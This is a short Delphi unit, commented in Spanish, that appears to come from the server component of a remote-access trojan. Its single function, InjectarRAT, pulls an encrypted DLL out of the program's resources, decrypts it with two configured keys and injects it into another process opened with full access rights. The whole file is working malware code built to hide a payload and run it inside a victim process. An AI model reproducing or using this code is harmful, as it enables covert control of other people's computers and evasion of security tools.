Unit Servidor;

interface
uses
  Windows,
  AfxCodeHook, //Creditos: Aphex;
  Variables,
  Funciones;

  function InjectarRAT(ResName: string; pid: dword):boolean;
  
implementation

function InjectarRAT(ResName: string; pid: dword):boolean;
  var
    ResourceLocation: HRSRC;
    ResourceSize:     longword;
    ResourceHandle:   THandle;
    ResourcePointer:  Pointer;
    handleWindow:     integer;
    Tempstr:          string;
  begin
     Result := true;
    //ResourceLocation := FindResource(HInstance, pchar('mi_dll'), RT_RCDATA);
    ResourceLocation := FindResource(SysInit.HInstance, PChar(ResName), 'DLL');
    //ShowMessage('es: '+IntTOStr(ResourceLocation));
    if ResourceLocation <> 0 then
    begin
      ResourceSize := SizeofResource(SysInit.HInstance, ResourceLocation);
      if ResourceSize <> 0 then
      begin
        ResourceHandle := LoadResource(SysInit.HInstance, ResourceLocation);
        if ResourceHandle <> 0 then
        begin
          ResourcePointer := LockResource(ResourceHandle);
          HandleWindow    := OpenProcess(PROCESS_ALL_ACCESS, False, pid);
          SetLength(tempstr, ResourceSize);
          Move(ResourcePointer^,tempstr[1], ResourceSize);//copiamos a tempstr y desciframos
          tempstr := cifrar(cifrar(tempstr, strtoint(configuracion.snumerocifrado2)), strtoint(configuracion.snumerocifrado));
          InjectLibrary(HandleWindow, @tempstr[1]);   //inyectamos despues de descifrar
        end
        else
          Result := false;
      end
      else
        Result := false;
    end
    else
      result := false;
  end;

end.